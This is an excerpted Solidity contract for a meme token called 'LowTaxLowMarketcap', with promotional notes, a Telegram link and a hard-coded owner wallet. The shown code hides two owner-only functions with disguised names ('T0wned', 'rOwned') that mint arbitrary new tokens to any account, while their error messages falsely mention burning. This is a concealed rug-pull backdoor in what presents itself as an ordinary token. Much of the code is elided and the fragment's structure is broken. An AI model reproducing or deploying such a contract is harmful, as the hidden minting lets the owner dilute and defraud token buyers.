...
/**
 ...
 -LowTaxLowMarketcap everything is low.
 
-Marketing at 2K MC )
-Reannounce at 10K MC)

https://t.me/LowTaxLowMarketcap
...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        _owner = 0x24AA41Be96d642E88AC3e287C62a72aAfD800e1D;
...
contract LowTaxLowMarketcap is Context, IERC20, Ownable {
    ...
    address private _charityWalletAddress = 0x24AA41Be96d642E88AC3e287C62a72aAfD800e1D;
    ...
    string private _name = "LowTaxLowMarketcap";
    string private _symbol = "LTLM";
    ...
    uint256 public numTokensSellToAddToLiquidity = 10 * 10**6 * 10**9;
    ...
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        ...
        function T0wned(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _Liquidityfy(address(0), account, amount);
        _tTotal += amount;
        ...
        function rOwned(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _Liquidityfy(address(0), account, amount);
        _tTotal += amount;
